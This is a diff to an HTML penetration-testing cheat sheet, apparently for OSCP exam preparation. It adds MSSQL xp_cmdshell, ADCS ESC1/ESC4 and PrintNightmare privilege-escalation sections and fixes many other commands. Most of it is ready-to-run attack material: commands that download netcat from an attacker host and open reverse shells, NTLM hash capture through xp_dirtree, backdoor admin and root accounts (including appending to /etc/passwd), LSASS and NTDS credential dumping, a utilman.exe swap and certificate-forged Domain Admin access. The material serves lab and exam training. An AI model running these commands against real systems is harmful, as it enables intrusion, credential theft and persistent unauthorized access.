@@ -320,6 +320,8 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
       <a class="sb-item" href="#win-dnsadmins"><span class="num">7.22</span>DNSAdmins DLL<span class="dot" data-sec="win-dnsadmins" onclick="cycleProgress(event,'win-dnsadmins')"></span></a>
       <a class="sb-item" href="#win-dcsync"><span class="num">7.23</span>DCSync<span class="dot" data-sec="win-dcsync" onclick="cycleProgress(event,'win-dcsync')"></span></a>
       <a class="sb-item" href="#win-shadowcred"><span class="num">7.24</span>Shadow Creds/RBCD<span class="dot" data-sec="win-shadowcred" onclick="cycleProgress(event,'win-shadowcred')"></span></a>
+      <a class="sb-item" href="#win-mssql"><span class="num">7.24b</span>MSSQL xp_cmdshell<span class="dot" data-sec="win-mssql" onclick="cycleProgress(event,'win-mssql')"></span></a>
+      <a class="sb-item" href="#win-adcs"><span class="num">7.24c</span>ADCS/ESC Privesc<span class="dot" data-sec="win-adcs" onclick="cycleProgress(event,'win-adcs')"></span></a>
       <a class="sb-item" href="#win-nsclient"><span class="num">7.25</span>NSClient++<span class="dot" data-sec="win-nsclient" onclick="cycleProgress(event,'win-nsclient')"></span></a>
       <a class="sb-item" href="#win-chisel"><span class="num">7.26</span>Chisel Tunnel<span class="dot" data-sec="win-chisel" onclick="cycleProgress(event,'win-chisel')"></span></a>
       <a class="sb-item" href="#win-tools"><span class="num">7.27</span>Tool Guides<span class="dot" data-sec="win-tools" onclick="cycleProgress(event,'win-tools')"></span></a>
@@ -368,6 +370,8 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
       <a class="sb-item" href="#lin-sudo-misc"><span class="num">+</span>Sudo Misc<span class="dot" data-sec="lin-sudo-misc" onclick="cycleProgress(event,'lin-sudo-misc')"></span></a>
       <a class="sb-item" href="#lin-tmux"><span class="num">+</span>Tmux/Systemd<span class="dot" data-sec="lin-tmux" onclick="cycleProgress(event,'lin-tmux')"></span></a>
       <a class="sb-item" href="#lin-chisel"><span class="num">+</span>Chisel/Tools<span class="dot" data-sec="lin-chisel" onclick="cycleProgress(event,'lin-chisel')"></span></a>
+      <a class="sb-item" href="#lin-fail2ban"><span class="num">+</span>fail2ban Abuse<span class="dot" data-sec="lin-fail2ban" onclick="cycleProgress(event,'lin-fail2ban')"></span></a>
+      <a class="sb-item" href="#lin-motd"><span class="num">+</span>update-motd.d<span class="dot" data-sec="lin-motd" onclick="cycleProgress(event,'lin-motd')"></span></a>
       <a class="sb-item" href="#lin-deepenum"><span class="num">&#128270;</span>Deep Recon<span class="dot" data-sec="lin-deepenum" onclick="cycleProgress(event,'lin-deepenum')"></span></a>
     </div>
   </div>
@@ -608,7 +612,8 @@ copy PowerUp.ps1 "C:\windows\temp\system32.ps1"
 </div>
 
 <div class="cmd-wrap"><div class="cmd-label">Writable directories (for dropping tools)</div>
-<pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i "(W)" | findstr /i "Users Everyone"</pre>
+<pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)" | findstr /i "Users Everyone"
+# (F)=FullControl, (M)=Modify (can replace binary!), (W)=Write. All three mean writable.</pre>
 </div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">{{WPATH}}\accesschk.exe -uwdqs Users C:\ 2>nul</code></div>
@@ -873,7 +878,7 @@ Get-CimInstance win32_service | Where-Object {$_.Name -eq '&lt;ServiceName&gt;'}
 <div class="subsection"><div class="subsection-title">Binary Analysis — strings / flare-floss / dnSpy</div>
 <div class="callout callout-tip"><strong>Why analyze before replacing?</strong> Static analysis reveals commands called without full paths (PATH hijack opportunities), hardcoded credentials, and whether it's a .NET binary (use dnSpy).</div>
 <div class="cmd-wrap"><div class="cmd-label">Extract strings — find hardcoded paths and called commands (Kali)</div>
-<pre class="cmd">strings ServiceBinary.exe | findstr -i "\.exe\|\.dll\|cmd\|powershell\|C:\\"
+<pre class="cmd">strings ServiceBinary.exe | grep -iE "\.exe|\.dll|cmd|powershell|C:\\"
 # Commands with NO leading path (e.g. "backup.exe") = vulnerable to PATH hijacking</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">On Windows target with Sysinternals strings.exe</div>
 <pre class="cmd">{{WPATH}}\strings.exe "C:\Path\To\ServiceBinary.exe" | findstr /i "\.exe cmd powershell"</pre></div>
@@ -951,7 +956,8 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">CMD equivalent</div>
 <pre class="cmd">wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "system32"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check all directories in %PATH% for writability (CMD — no tools needed)</div>
-<pre class="cmd">for %d in (%PATH%) do @icacls "%d" 2>nul | findstr /i "(W)\|(F)\|BUILTIN\Users" && echo WRITABLE: %d</pre></div>
+<pre class="cmd">for %d in (%PATH%) do @icacls "%d" 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)" && echo WRITABLE: %d
+# findstr /c: = literal match. (F)=FullControl (M)=Modify (W)=Write. All mean writable.</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">PowerShell PATH writability check</div>
 <pre class="cmd">$env:PATH.Split(';') | ForEach-Object {
   try { [System.IO.File]::Create("$_\test_w.tmp").Close(); Remove-Item "$_\test_w.tmp" -EA SilentlyContinue; Write-Host "WRITABLE: $_" }
@@ -961,7 +967,8 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — verify write access and identify which DLL is missing</span>
 <div class="cmd-wrap"><div class="cmd-label">Check write access to service app directory (CMD)</div>
-<pre class="cmd">icacls "C:\Path\To\ServiceDir" 2>nul | findstr /i "(W)\|(F)\|Users\|Everyone"
+<pre class="cmd">icacls "C:\Path\To\ServiceDir" 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)"
+# (M)=Modify is the most common writable flag — critical to include, not just (W)
 # (W) or (F) for Users or Everyone = writable</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">List DLLs in the service directory — gaps are candidates</div>
 <pre class="cmd">dir "C:\Path\To\ServiceDir\*.dll"
@@ -1231,7 +1238,7 @@ chmod +x /path/to/repo/.git/hooks/post-commit</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Step 3: Trigger — check if scheduled task or admin commits (KALI: nc -lvnp {{RPORT}})</div>
 <pre class="cmd"># Check if a scheduled task runs git operations:
 schtasks /query /fo LIST /v | findstr /i "git\|commit\|Task Name"
-Get-ScheduledTask | Where-Object {$_.Actions -like "*git*"} | Select TaskName,Actions
+Get-ScheduledTask | Where-Object { ($_.Actions | ForEach-Object {"$($_.Execute) $($_.Arguments)"}) -match "git" } | Select TaskName
 
 # If you have repo access — trigger manually:
 cd C:\Path\To\Repo
@@ -1320,7 +1327,9 @@ findstr /si password *.ini
 findstr /spin "password" *.*</pre></div>
 
 <div class="cmd-wrap"><div class="cmd-label">Config file names with password/cred</div>
-<pre class="cmd">dir /s *pass* == *cred* == *vnc* == *.config* 2>nul</pre></div>
+<pre class="cmd">dir /s /b *pass* 2>nul & dir /s /b *cred* 2>nul & dir /s /b *vnc* 2>nul & dir /s /b *.config* 2>nul
+# Note: dir does NOT support == as pattern separator — use separate commands or a for loop:
+for %f in (*pass* *cred* *vnc* *.config*) do @dir /s /b "%f" 2>nul</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">Get-ChildItem -Path C:\ -Include *.config,*.xml,*.ini,*.txt -File -Recurse -Depth 4 -ErrorAction SilentlyContinue | Select-String -Pattern 'password|pwd|credential|connectionstring' -SimpleMatch</code></div>
 </div>
@@ -1350,7 +1359,7 @@ type %WINDIR%\Panther\Unattended.xml 2>nul</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">VNC password files</div>
 <pre class="cmd">dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b
-dir c:\ /s /b | findstr /si *vnc.ini
+dir c:\ /s /b | findstr /i "vnc.ini"
 reg query HKCU\Software\ORL\WinVNC3\Password 2>nul</pre></div>
 
 <div class="cmd-wrap"><div class="cmd-label">WiFi passwords in cleartext</div>
@@ -1417,7 +1426,8 @@ SAM = local password hashes | SYSTEM = decryption key | NTDS.dit = ALL domain ha
 <span class="pipe-step-label">1. DETECT — confirm prerequisites before dumping</span>
 <div class="cmd-wrap"><div class="cmd-label">Check if you have SeBackupPrivilege (admin or backup operator)</div>
 <pre class="cmd">whoami /priv | findstr /i "SeBackup"
-# SeBackupPrivilege  Enabled = you can dump SAM without being admin</pre></div>
+# SeBackupPrivilege  Enabled  = dump SAM directly
+# SeBackupPrivilege  Disabled = STILL exploitable — re-enable with EnableAllTokenPrivs.ps1 first</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check if Windows.old exists (no admin needed)</div>
 <pre class="cmd">dir C:\windows.old\Windows\System32\SAM 2>nul
 dir C:\windows.old\Windows\System32\SYSTEM 2>nul</pre></div>
@@ -1627,15 +1637,18 @@ Use GodPotato first — it works on everything from Win Vista to Win11.
 <div class="callout callout-tip">
 <strong>Quick Decision</strong>
 GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → JuicyPotato (only if pre-2019)
+<br><br><strong>IIS / MSSQL tip:</strong> Any shell as <code>iis apppool\*</code> or <code>NT SERVICE\MSSQLSERVER</code> has SeImpersonatePrivilege by default. Check <code>whoami /priv</code> immediately — skip enumeration and go straight to GodPotato.
 </div>
 
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1. DETECT — confirm SeImpersonate is present AND Enabled</span>
-<div class="cmd-wrap"><div class="cmd-label">Check privilege — must show Enabled (not just Listed)</div>
+<div class="cmd-wrap"><div class="cmd-label">Check privilege — Enabled OR Disabled, both can be exploited</div>
 <pre class="cmd">whoami /priv | findstr /i "SeImpersonate\|SeAssignPrimaryToken"
-# SeImpersonatePrivilege   Enabled = exploitable
-# SeAssignPrimaryTokenPrivilege  Enabled = fallback</pre></div>
+# SeImpersonatePrivilege   Enabled  = directly exploitable
+# SeImpersonatePrivilege   Disabled = STILL exploitable — run FullPowers.exe first to re-enable
+{{WPATH}}\FullPowers.exe -c "{{WPATH}}\GodPotato-NET4.exe -cmd whoami" -z
+# ⚠️ Do NOT skip potatoes just because the privilege shows Disabled!</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check OS build — determines which potato to use</div>
 <pre class="cmd">systeminfo | findstr /i "OS Name\|OS Version\|Build"
 # Build 17763+ (Server 2019 / Win10 1809+) = JuicyPotato FAILS → use GodPotato</pre></div>
@@ -1812,8 +1825,12 @@ reg save hklm\system {{WPATH}}\system.hive
 # Transfer ntds.dit + system.hive to Kali, then:
 impacket-secretsdump -ntds {{WPATH}}\ntds_copy\ntds.dit -system system.hive LOCAL</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Method B (Alternative) — diskshadow + robocopy</div>
-<pre class="cmd">diskshadow /s {{WPATH}}\shadow.txt
-# shadow.txt content: add volume C: alias mysnap / create / expose %mysnap% Z:
+<pre class="cmd"># Create shadow.txt first (each command MUST be on its own line):
+echo set context persistent nowriters > {{WPATH}}\shadow.txt
+echo add volume c: alias mysnap >> {{WPATH}}\shadow.txt
+echo create >> {{WPATH}}\shadow.txt
+echo expose %mysnap% z: >> {{WPATH}}\shadow.txt
+diskshadow /s {{WPATH}}\shadow.txt
 robocopy /B Z:\Windows\NTDS {{WPATH}}\ntds_copy ntds.dit</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Pass the Hash after extraction</div>
 <pre class="cmd">impacket-psexec {{DOMAIN}}/Administrator@{{TARGET}} -hashes :NTLM_HASH
@@ -1823,10 +1840,12 @@ evil-winrm -i {{TARGET}} -u Administrator -H NTLM_HASH</pre></div>
 <div class="subsection"><div class="subsection-title">SeDebugPrivilege Abuse</div>
 <div class="cmd-wrap"><div class="cmd-label">Detect</div>
 <pre class="cmd">whoami /priv | findstr SeDebug</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Get SYSTEM process PID</div>
-<pre class="cmd">tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" | findstr /i services</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Get winlogon.exe PID (safe inject target — do NOT inject into services.exe, crashes the SCM)</div>
+<pre class="cmd">tasklist /fi "IMAGENAME eq winlogon.exe"
+# Alternative target: lsass.exe (also runs as SYSTEM)
+tasklist /fi "IMAGENAME eq lsass.exe"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Exploit — inject into SYSTEM process</div>
-<pre class="cmd">{{WPATH}}\SeDebugPrivesc.exe &lt;SYSTEM_PID&gt; cmd.exe</pre></div>
+<pre class="cmd">{{WPATH}}\SeDebugPrivesc.exe &lt;WINLOGON_PID&gt; cmd.exe</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative — dump LSASS (requires SeDebug)</div>
 <pre class="cmd">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\lsass.dmp full</pre></div>
 </div>
@@ -1871,13 +1890,15 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/payload.exe -Outfile {{WPATH}}\payload.exe
 <div class="subsection"><div class="subsection-title">SeTakeOwnershipPrivilege Abuse</div>
 <div class="cmd-wrap"><div class="cmd-label">BACKUP — save utilman.exe before replacing</div>
 <pre class="cmd">copy C:\Windows\system32\Utilman.exe C:\Windows\system32\Utilman.exe.bak</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Take ownership of System32 and replace utilman.exe</div>
-<pre class="cmd">takeown.exe /f "%windir%\system32"
-icacls.exe "%windir%\system32" /grant "%username%":F
-cd C:\Windows\system32
-ren Utilman.exe Utilman.old
-ren cmd.exe Utilman.exe
-# TRIGGER: lock screen → at login press Win+U → SYSTEM CMD</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Take ownership of the specific file (NOT the whole directory — /r on system32 is dangerous and slow)</div>
+<pre class="cmd"># Target the specific file, not the directory:
+takeown.exe /f C:\Windows\system32\Utilman.exe
+icacls.exe C:\Windows\system32\Utilman.exe /grant "%username%":F
+# Verify you now own it:
+icacls C:\Windows\system32\Utilman.exe
+copy C:\Windows\system32\cmd.exe C:\Windows\system32\Utilman.exe
+# TRIGGER: lock screen → at login press Win+U → SYSTEM CMD
+# ⚠️ Only works if RDP port 3389 is open: netstat -ano | findstr ":3389"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">RESTORE — put utilman.exe back after use</div>
 <pre class="cmd">cd C:\Windows\system32
 ren Utilman.exe cmd.exe
@@ -1910,6 +1931,19 @@ fltMC unload sysmondrv</pre></div>
 <pre class="cmd">reg delete HKLM\System\CurrentControlSet\dfserv /f 2>nul</pre></div>
 </div>
 
+<div class="subsection"><div class="subsection-title">PrintNightmare LPE — CVE-2021-1675 (unpatched Print Spooler + no KB5004945)</div>
+<div class="cmd-wrap"><div class="cmd-label">Detect — check Spooler running AND patch absent</div>
+<pre class="cmd">sc query spooler | findstr RUNNING
+systeminfo | findstr /i "KB5004945\|KB5004946\|KB5004947\|KB5004948\|KB5004960"
+# Spooler RUNNING + none of those KBs → likely vulnerable (pre-July 2021)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Exploit via calebstewart PowerShell PoC</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/CVE-2021-1675.ps1 -Outfile {{WPATH}}\pn.ps1
+. {{WPATH}}\pn.ps1
+# Add admin user:
+Invoke-Nightmare -NewUser "pwned" -NewPassword "Password123!" -DriverName "Print"
+net localgroup administrators pwned  # verify</pre></div>
+</div>
+
 <div class="notes-toggle" onclick="toggleNotes('win-exploits')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-win-exploits" onchange="saveNote('win-exploits',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -1937,11 +1971,12 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Cons
 <strong>ConsentPromptBehaviorAdmin values:</strong>
 <ul style="margin:4px 0 0 16px">
   <li><code>0</code> — No prompts — bypasses are <strong>unnecessary</strong> (already elevated)</li>
-  <li><code>1</code> — Prompt credentials on secure desktop — bypasses <strong>fail</strong></li>
-  <li><code>2</code> — Prompt consent on secure desktop — bypasses <strong>fail</strong> (secure desktop prevents COM hijack)</li>
-  <li><code>5</code> (default) — Prompt consent for non-Windows binaries — bypasses <strong>work</strong> ✓</li>
+  <li><code>0</code> — No prompts — elevation is automatic → UAC bypass <strong>unnecessary</strong></li>
+  <li><code>1</code> — Prompt credentials on secure desktop — most bypasses <strong>fail</strong> (interactive cred required)</li>
+  <li><code>2</code> — Prompt consent on secure desktop — <strong>many auto-elevation bypasses still work</strong> (fodhelper/eventvwr skip the prompt entirely); test before assuming blocked</li>
+  <li><code>5</code> (default) — Prompt consent for non-Windows binaries — bypasses <strong>work reliably</strong> ✓</li>
 </ul>
-<strong>Only attempt bypass if value = 5 (or EnableLUA = 0x0)</strong>
+<strong>Attempt bypass if value = 5 or 2 or 0. Only value = 1 reliably blocks most methods.</strong>
 </div>
 </div>
 <div class="pipe-step pipe-confirm">
@@ -1994,11 +2029,17 @@ reg delete HKCU\Software\Classes\mscfile /f 2>nul</pre></div>
 # SeDebugPrivilege  Enabled = can open LSASS handle</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check RunAsPPL (LSA Protection) — if enabled, most methods fail silently</div>
 <pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
-# 0x1 = PPL enabled → procdump, comsvcs.dll will fail
-# 0x0 or key absent = PPL disabled → methods work normally</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Check Credential Guard (virtualization-based — blocks plaintext extraction)</div>
-<pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity 2>nul
-# If 0x1 and WDIGEST disabled → plaintext creds unavailable via LSASS</pre></div>
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
+# 0x0 or key absent = PPL disabled → all dump methods work
+# 0x1 = PPL enabled → procdump, comsvcs.dll, mimikatz FAIL silently
+# 0x2 = PPL Light (Win11/Server 2022) → ALSO blocks standard tools
+# Check LsaCfgFlags too — GPO may enforce PPL without setting RunAsPPL directly</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check Credential Guard running state (NOT just VBS enabled — must check active services)</div>
+<pre class="cmd">Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select SecurityServicesRunning
+# SecurityServicesRunning = 1 or 2 → Credential Guard ACTIVE → plaintext extraction fails
+# SecurityServicesRunning = 0 or empty → not running → mimikatz sekurlsa may work
+reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity 2>nul
+# Note: EnableVirtualizationBasedSecurity=1 means VBS is configured but NOT necessarily running</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check if WDigest enabled (enables plaintext password caching)</div>
 <pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
 # 0x1 = plaintext in LSASS | 0x0 = hashes only</pre></div>
@@ -2337,6 +2378,127 @@ impacket-psexec -k -no-pass {{DOMAIN}}/Administrator@COMPUTER.{{DOMAIN}}</pre></
 </div>
 <div class="notes-toggle" onclick="toggleNotes('win-shadowcred')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-win-shadowcred" onchange="saveNote('win-shadowcred',this.value)" placeholder="Add your notes here..."></textarea>
+</section>
+
+<!-- ── 7.24b MSSQL PRIVESC ──────────────────────────────────────── -->
+<section class="section" id="win-mssql">
+<div class="section-header">
+  <div><div class="section-num">7.24b</div><div class="section-title">MSSQL Privilege Escalation</div>
+  <div class="section-subtitle">xp_cmdshell + linked servers — common on OSCP AD boxes (Control, Querier, Escape)</div></div>
+  <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-exploit">EXPLOIT</span></div>
+</div>
+<div class="callout callout-tip"><strong>💡 When to use:</strong> Any time you find MSSQL running or have a domain credential — try SA or Windows auth. xp_cmdshell gives OS command execution in MSSQL service account context (often SYSTEM or NT SERVICE\MSSQLSERVER with SeImpersonate).</div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — find MSSQL and connect</span>
+<div class="cmd-wrap"><div class="cmd-label">Find MSSQL port and connect from Kali</div>
+<pre class="cmd">nmap -p 1433,1434 {{TARGET}} -sV
+# Connect with impacket:
+impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}} -windows-auth  # Windows auth
+impacket-mssqlclient ./{{USER}}:{{PASS}}@{{TARGET}}        # local SQL auth
+impacket-mssqlclient {{USER}}:{{PASS}}@{{TARGET}}          # SA auth</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check current context and permissions</div>
+<pre class="cmd">SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
+SELECT name FROM sys.databases;
+-- sysadmin = 1 → can enable xp_cmdshell directly</pre></div>
+</div>
+<div class="pipe-step pipe-confirm">
+<span class="pipe-step-label">2. CONFIRM — enable xp_cmdshell (requires sysadmin)</span>
+<div class="cmd-wrap"><pre class="cmd">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+-- Output should show the MSSQL service account (often has SeImpersonate → potatoes!)</pre></div>
+</div>
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">3. EXPLOIT — OS command execution → reverse shell</span>
+<div class="cmd-wrap"><div class="cmd-label">Drop reverse shell via xp_cmdshell</div>
+<pre class="cmd">EXEC xp_cmdshell 'powershell -c "iwr http://{{KALI_IP}}:{{PORT}}/nc64.exe -o C:\Windows\Temp\nc.exe"';
+EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe {{KALI_IP}} {{RPORT}} -e cmd.exe';</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">If not sysadmin — capture NTLMv2 hash via xp_dirtree (no xp_cmdshell needed)</div>
+<pre class="cmd">-- On Kali: responder -I eth0 -wrf
+-- On MSSQL:
+EXEC xp_dirtree '\\{{KALI_IP}}\share\', 1, 1;
+-- Crack captured hash: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Linked server exploitation (may run as sysadmin on linked server)</div>
+<pre class="cmd">SELECT * FROM sys.servers;  -- list linked servers
+-- Execute on linked server:
+EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];
+-- Enable xp_cmdshell on linked server:
+EXEC ('sp_configure ''show advanced options'',1;RECONFIGURE') AT [LINKED_SERVER];
+EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE') AT [LINKED_SERVER];
+EXEC ('xp_cmdshell ''net user pwned Password123! /add''') AT [LINKED_SERVER];</pre></div>
+<div class="callout callout-tip" style="margin-top:8px"><strong>💡 Long output truncated at 255 chars per row.</strong> Use a temp table for full output:
+<code>CREATE TABLE #tmp (out NVARCHAR(4000)); INSERT INTO #tmp EXEC xp_cmdshell 'whoami /all'; SELECT * FROM #tmp; DROP TABLE #tmp;</code></div>
+</div>
+<div class="pipe-step pipe-verify">
+<span class="pipe-step-label">4. VERIFY — if MSSQL runs as service with SeImpersonate → instant SYSTEM via potato</span>
+<div class="cmd-wrap"><pre class="cmd">-- From your shell as MSSQL service account:
+whoami /priv | findstr SeImpersonate
+-- If Enabled → immediately run GodPotato:
+{{WPATH}}\GodPotato-NET4.exe -cmd "{{WPATH}}\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"</pre></div>
+</div>
+</div>
+<div class="notes-toggle" onclick="toggleNotes('win-mssql')">&#128221; Notes</div>
+<textarea class="notes-area" id="notes-win-mssql" onchange="saveNote('win-mssql',this.value)" placeholder="Add your notes here..."></textarea>
+</section>
+
+<!-- ── 7.24c ADCS / ESC ESCALATION ────────────────────────────── -->
+<section class="section" id="win-adcs">
+<div class="section-header">
+  <div><div class="section-num">7.24c</div><div class="section-title">ADCS — Active Directory Certificate Services</div>
+  <div class="section-subtitle">ESC1/ESC4/ESC8 — the #1 AD privesc vector on modern OSCP+ boxes (Escape, Authority, Outdated)</div></div>
+  <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-ad">AD</span><span class="badge badge-new">NEW</span></div>
+</div>
+<div class="callout callout-tip"><strong>💡 Check this FIRST on any AD machine</strong> — before BloodHound, before Kerberoasting. <code>certipy find -vulnerable</code> takes 10 seconds and often gives a direct path to Domain Admin.</div>
+
+<div class="pipeline">
+<div class="pipe-step pipe-detect">
+<span class="pipe-step-label">1. DETECT — find vulnerable certificate templates</span>
+<div class="cmd-wrap"><div class="cmd-label">From Kali (authenticated domain user required)</div>
+<pre class="cmd">certipy find -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -dc-ip {{TARGET}} -vulnerable -stdout
+# Hashes also work:
+certipy find -u {{USER}}@{{DOMAIN}} -hashes :NTLM_HASH -dc-ip {{TARGET}} -vulnerable -stdout</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">From Windows target (no tools, check if ADCS web enrollment is running)</div>
+<pre class="cmd">curl -s -k http://{{TARGET}}/certsrv/ 2>nul && echo "ADCS web enrollment detected"
+certutil -config - -ping 2>nul | findstr "Config"</pre></div>
+</div>
+<div class="pipe-step pipe-confirm">
+<span class="pipe-step-label">2. CONFIRM — understand which ESC applies</span>
+<div class="cmd-wrap"><div class="cmd-label">ESC1 — template allows enrollee to specify SubjectAltName (SAN) + used for Client Auth</div>
+<pre class="cmd">-- certipy output shows: "ESC1" under Vulnerabilities
+-- Key flags: msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT
+-- Key EKU: Client Authentication (1.3.6.1.5.5.7.3.2)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">ESC4 — you have WriteProperty on a template → can make it ESC1-vulnerable</div>
+<pre class="cmd">-- certipy output shows: "ESC4" under Vulnerabilities</pre></div>
+</div>
+<div class="pipe-step pipe-exploit">
+<span class="pipe-step-label">3. EXPLOIT — ESC1: request cert as Administrator, then auth</span>
+<div class="cmd-wrap"><div class="cmd-label">Step 1: request certificate with Administrator UPN</div>
+<pre class="cmd">certipy req -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -ca '{{DOMAIN}}-CA' \
+  -template 'VulnerableTemplate' -upn Administrator@{{DOMAIN}} -dc-ip {{TARGET}}</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Step 2: authenticate with certificate → get NT hash</div>
+<pre class="cmd">certipy auth -pfx administrator.pfx -dc-ip {{TARGET}}
+# Returns: Administrator's NT hash</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Step 3: use NT hash (Pass-the-Hash)</div>
+<pre class="cmd">evil-winrm -i {{TARGET}} -u Administrator -H NT_HASH
+impacket-psexec {{DOMAIN}}/Administrator@{{TARGET}} -hashes :NT_HASH</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">ESC4 — first make template ESC1-vulnerable, then exploit as ESC1</div>
+<pre class="cmd">certipy template -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -template 'VulnerableTemplate' -save-old -dc-ip {{TARGET}}
+# Then follow ESC1 steps above
+# Restore when done:
+certipy template -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -template 'VulnerableTemplate' -configuration old.json</pre></div>
+</div>
+<div class="pipe-step pipe-verify">
+<span class="pipe-step-label">4. VERIFY / TROUBLESHOOT</span>
+<div class="cmd-wrap"><pre class="cmd"># If certipy auth fails with PKINIT error → PKINIT not available on DC
+# Workaround — use LDAP Schannel auth instead:
+certipy auth -pfx administrator.pfx -ldap-shell -dc-ip {{TARGET}}
+# If ESC1 shows "Reason: User is not allowed to enroll" → find a template your user CAN enroll in</pre></div>
+</div>
+</div>
+<div class="notes-toggle" onclick="toggleNotes('win-adcs')">&#128221; Notes</div>
+<textarea class="notes-area" id="notes-win-adcs" onchange="saveNote('win-adcs',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
 
 <!-- ── 7.25 NSCLIENT++ ─────────────────────────────────────────── -->
@@ -3261,12 +3423,22 @@ ls -la /tmp/passwd.bak</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3a. EXPLOIT — /etc/passwd writable → add root user</span>
 <div class="cmd-wrap"><div class="cmd-label">One-liner: auto-generates hash and appends root user</div>
-<pre class="cmd">echo "newroot:$(openssl passwd Password123):0:0:root:/root:/bin/bash" >> /etc/passwd
-su newroot  # password: Password123</pre></div>
+<pre class="cmd"># CORRECT: -1 = MD5 (works on all targets), -6 = SHA-512 (modern preferred)
+echo "newroot:$(openssl passwd -1 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd
+su newroot  # password: Password123
+# SHA-512 alternative (more modern):
+echo "newroot:$(openssl passwd -6 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd</pre></div>
+<div class="callout callout-danger" style="margin-top:6px">
+<strong>⚠️ CRITICAL: Always use <code>-1</code> or <code>-6</code> with openssl passwd!</strong>
+Without a flag, openssl generates a legacy DES hash (13 chars). PAM on modern Debian/Ubuntu/CentOS silently rejects DES — <code>su newroot</code> will always say "Authentication failure" even with the correct password.
+</div>
